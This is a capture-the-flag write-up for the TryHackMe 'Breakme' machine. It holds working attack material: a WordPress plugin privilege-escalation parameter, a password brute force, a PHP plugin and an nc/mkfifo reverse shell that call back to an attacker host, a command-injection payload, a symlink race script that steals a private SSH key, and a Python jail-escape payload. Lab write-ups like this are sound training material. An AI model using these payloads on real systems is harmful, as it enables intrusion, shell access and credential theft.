# Breakme TryHackMe WriteUp
## Machine IP = 10.113.159.67
Firstly, lets discover at the open ports.
```bash
rustscan -a 10.113.159.67 --ulimit 5000
```
We have only two open ports: [22, 80]. Let's explore the web site. It was a simple apache web-page. Let's discover the directories by using FFUF:  
```bash
ffuf -u http://10.113.159.67/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0,44 -t 250

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5369ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5390ms]
index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 67ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6424ms]
manual                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 244ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 68ms]
wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 74ms]
```
Yeahh, It uses wordpress. I decided to use **"wpscan"** to find if there is any vulnerable plugin and chech which users exist in there:
```bash
wpscan --update
wpscan --url http://10.113.159.67/wordpress --api-token U3EdJ2nWce7cVFEUVvsa2sXXXXXXXXXXXXXXXX
```
We have found a vulnerable plugin:
```bash
[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://10.113.159.67/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2026-03-09T00:01:00.000Z
 | [!] The version is out of date, the latest version is 5.5.69

 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.113.159.67/wordpress/wp-content/plugins/wp-data-access/readme.txt
```
You can learn about it bysearching ***"wp-data-access privilege escalation vulnerability for 5.3.5 version"***. Basically, we will get the request by using burpsuite while we are trying to update current user's account. It can be it's bio, name, password or other things. We will add **"&wpda_role[]=administrator"** at the end of the request header.  
But first of all, we need to access a normal user's account. We can learn which users are accessed in this web-site by this command:  
```bash
wpscan --url http://10.113.159.67/wordpress --enumerate u

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.113.159.67/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bob
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
As we know, we need normal user's account to be administrator simply, let's bruteforce for **bob** user.  
```bash
wpscan --url http://10.113.159.67/wordpress -U bob -P /usr/share/wordlists/rockyou.txt -vv

# bob:soccer
```
The login page always located at **"http://IP/wordpress/wp-admin/"**. We are in !!!!    

----
### To Became Wordpress Admin  
There is a **"Biographical Info"** section on profile page for the bob user. We will add something in there like a string "aa".   
The next step is to intercept the request while we click the update button after fill the BIO section.    
|  
<img width="1606" height="941" alt="image" src="https://github.com/user-attachments/assets/7dc39f98-c968-44ab-a69a-5ea0725d0d35" />
|  
It will looks like this. Now, all we need is to add **"&wpda_role[]=administrator"** at the end of the request. Then, we will click **"Forward"** and **"Send"**.  
Now, we have **"Administrator Capabilities"**. As you can see from the navigation bar at the left, there were several functions added. They couldn't be seen by "Bob" user. I checked **"Appearance--> Editor--> Update 404.php"** method but cannot do it. It is a little bit differend wordpress CTF for me compared to old ones.  
So, I decided to do reverse shell by the help of **"Add Plugin"** section. We need to create a php file to get revershell at first.  
```bash
<?php
/*
Plugin Name: Call Home
Plugin URI: http://127.0.0.1
Description: This plugin calls ET.
Version: 1.0
Author: Gand0rf
License: GPLv2 or later
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT_NUMBER 0>&1'");?>
```
I leveraged the 'Plugin Upload' feature to achieve Remote Code Execution (RCE). By uploading a ZIP file containing a simple PHP reverse shell, I was able to trigger a connection back to my machine. So, lets zip this file before uploading to the web-site:  
```bash
zip shell.zip shell.php
```
To begin with, open your nc connetion on the temrinal before uploading the plugin. After this, you should follow these steps on the website:    
**(Plugins --> Add new plugin --> Upload plugin --> Select and install the zip file --> Activate Plugin)**.    
And BINGOO!!! We get the shell as *"www-data"* user.  
<img width="1066" height="236" alt="image" src="https://github.com/user-attachments/assets/14f205aa-69a4-427c-941c-fe4c28d97f62" />  

----
# First Flag
We don't have access to user files. We need to be john at first. The sudo -l, SUID binaries, wp-config.php file, crontabs, getcap command didn't give me anything to get john user. So, I decided to check processes by this command: **"ps aux"**.  
While performing post-exploitation enumeration with ps aux, I discovered an interesting process running under the user john. He was running a local PHP development server on port 9999:   
```bash
john 500 0.0 0.9 193800 20112 ? Ss 09:17 0:00 /usr/bin/php -S 127.0.0.1:9999
```
Since this service was bound to 127.0.0.1, it was not accessible from my external attack machine. This immediately suggested that I needed to find a way to access this internal service, possibly through Local Port Forwarding or by exploring John's home directory for the source code of this application.   
I decided to use **"socat"** because in target terminal it is enable. What I did?:
```bash
# In target terminal:
socat TCP-LISTEN:5555,fork TCP:127.0.0.1:9999

# In my kali: 
socat TCP-LISTEN:9999,fork TCP:10.113.159.67:5555

# Open thos URL:
http://127.0.0.1:9999/
```

I used socat to create a bridge between the target's internal web server and my Kali machine. Since port 9999 was only open locally, this tunnel allowed me to 'bring' the hidden website to my own browser.   
By doing this, I could easily interact with the application and test for vulnerabilities like Command Injection.  
|  
<img width="3063" height="1189" alt="image" src="https://github.com/user-attachments/assets/05c92f12-5830-4192-8335-4df57fd994d7" />  
|  
Yeahh, it is our web-page. Let's look at what happens when we search "john" user.  
|  
<img width="1033" height="863" alt="image" src="https://github.com/user-attachments/assets/cf0e2d92-c375-4fef-b8e9-efea4a9ccd90" />  
|    
Hmm, lets check this special characters:    
`  
!@#$%^&*()_+-={}[]|:;’”<>,.?/    
`  
|    
<img width="1033" height="863" alt="image" src="https://github.com/user-attachments/assets/9c484f24-54b5-4e08-80bc-5358b05853ed" />      
|    
Hmm, This means the {}| special characters are allowed which will be very useful for us when we will create the reverseshell command. Because it ensures that we will not be blocked because of prohibited special characters.  
Create a bash script on the www-user's terminal and call it rev.sh, within it we are going to input:      
```bash
printf '#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.137.68 1111 >/tmp/f' > /dev/shm/rev.sh
chmod +x rev.sh

# Don't forget to open nc connection with 1111 port on your kali terminal. After this, execute this command on target machine:
curl -X POST http://127.0.0.1:9999/ --data-urlencode "cmd2=|/dev/shm/rev.sh||"
```
And BINGOOO! We get the shell. We are john right now. Lets take it's flag.      

I decided to create ssh key for the "John" user, so will not need to repeat this proccess in each time:      
```bash 
ssh-keygen -t rsa

# Choose a name like johnn_key
# Now we have two file: johnn_key and johnn_key.pub
# Copy the content of "johnn_key.pub" and do these steps on the target to assign key for the john user:

cd ~
mkdir .ssh
cd .ssh
echo 'ssh-rsa AAAAB3NzaCA......Ah+xuewIa0Uc= faridd@Ferid' > authorized_keys

# Then, do it on your terminal to get "john" user's shell
ssh -i johnn_key john@10.113.159.67
```
----
### Youcef's Flag  
In youcef's directory, we saw an executable file which has a name like "readfile". I forwarded it into my own kali and used ghidra to read its content:    
```bash
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  __uid_t _Var2;
  undefined8 uVar3;
  ssize_t sVar4;
  stat local_4b8;
  undefined1 local_428 [1024];
  int local_28;
  int local_24;
  int local_20;
  uint local_1c;
  char *local_18;
  char *local_10;
  
  if (param_1 == 2) {
    iVar1 = access(*(char **)(param_2 + 8),0);
    if (iVar1 == 0) {
      _Var2 = getuid();
      if (_Var2 == 0x3ea) {
        local_10 = strstr(*(char **)(param_2 + 8),"flag");
        local_18 = strstr(*(char **)(param_2 + 8),"id_rsa");
        lstat(*(char **)(param_2 + 8),&local_4b8);
        local_1c = (uint)((local_4b8.st_mode & 0xf000) == 0xa000);
        local_20 = access(*(char **)(param_2 + 8),4);
        usleep(0);
        if ((((local_10 == (char *)0x0) && (local_1c == 0)) && (local_20 != -1)) &&
           (local_18 == (char *)0x0)) {
          puts("I guess you won!\n");
          local_24 = open(*(char **)(param_2 + 8),0);
          if (local_24 < 0) {
                    /* WARNING: Subroutine does not return */
            __assert_fail("fd >= 0 && \"Failed to open the file\"","readfile.c",0x26,"main");
          }
          do {
            sVar4 = read(local_24,local_428,0x400);
            local_28 = (int)sVar4;
            if (local_28 < 1) break;
            sVar4 = write(1,local_428,(long)local_28);
          } while (0 < sVar4);
          uVar3 = 0;
        }
        else {
          puts("Nice try!");
          uVar3 = 1;
        }
      }
      else {
        puts("You can\'t run this program");
        uVar3 = 1;
      }
    }
    else {
      puts("File Not Found");
      uVar3 = 1;
    }
  }
  else {
    puts("Usage: ./readfile <FILE>");
    uVar3 = 1;
  }
  return uVar3;
```

#### The program follows these steps:  

    It ensures exactly one argument (the filename) is provided.
    It checks whether the file exists using access(argv[1], F_OK).
    It verifies that the user running the program is john (UID 1002).
    It blocks access if the filename contains "flag" or "id_rsa".
    It checks if the file is a symlink.
    It verifies whether john has read permissions on the file.
    If all conditions are met, it reads and outputs the file’s contents. Otherwise, it prints "Nice try!".

#### Bypassing the Restrictions  
The main restrictions are:  

    The filename must not contain "flag" or "id_rsa".
    The file must not be a symbolic link.
    The john user must have read permissions.

The main goal is to get the id_rsa file of the user **"Youcef"**. So, I made a script for it.    
```bash
#!/bin/bash

# Loop to swap links in the background
while true; do
    ln -sf /home/youcef/.ssh/id_rsa tem
    rm -f tem
    touch tem
done &

echo "Searching for the key..."
# Read until the key is found and write it to a file
while true; do
    # Direct the output to a file
    /home/youcef/readfile tem 2>/dev/null > /dev/shm/found_key
    
    # Check if the file contains the actual key (not empty)
    if grep -q "PRIVATE" /dev/shm/found_key; then
        echo -e "\n[BINGO!] Key has been written to /dev/shm/found_key!"
        # Kill only the background ln/rm loop
        kill $! 
        break
    fi
done
```
I developed a bash script to exploit a Race Condition (TOCTOU) vulnerability in the readfile binary. The script runs a background loop that rapidly switches a symbolic link (tem) between a file I have permission to read and the protected id_rsa file. Simultaneously, it repeatedly executes the binary until the check and the use operations overlap, allowing the program to read the private key and save it to /dev/shm/found_key.  

Bingooo !!! We got the SSH key. Lets decrypt it on our kali:    
```bash
ssh2john key > rsa.hash
john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
john --show rsa.hash
```
Now, we also hav the passphase. Lets use it to be user **"Youcef"**.    
```bash
chmod 600 key
ssh -i key youcef@10.113.159.67
```
And we get the second flag from "**.ssh**" folder.  

----
## Privilege Escalation  
When we check **"sudo -l"**, we will se something like this:    
```bash
youcef@Breakme:~$ sudo -l
Matching Defaults entries for youcef on breakme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User youcef may run the following commands on breakme:
    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
```
Executing the script presents us with a restricted Python environment. Our goal is to escape this jail and gain root access. https://shirajuki.js.org/blog/pyjail-cheatsheet/?source=post_page-----5ac95bd41efa--------------------------------------- There is so much payloads for escaping from this jail. We only need to check some parameters like imports, os, system and etc. In this way we can be sure that which of these payloads are restricted and we will try to use alternatives. For example, if lowercase 'os' is restricted, we will use 'OS'.casefold(). The python will replace it with 'os' whet it runs, but the filter just look at it and say that yeah they are uppercase and aren't restricted so, you can go. By using this gap, We will be root. Just use this payload after several checkings:  
```bash
print(__builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__[f'SYSTEM'.casefold()]('BASH'.casefold()))
```
And BINGOOO !!!! We are root right now.  















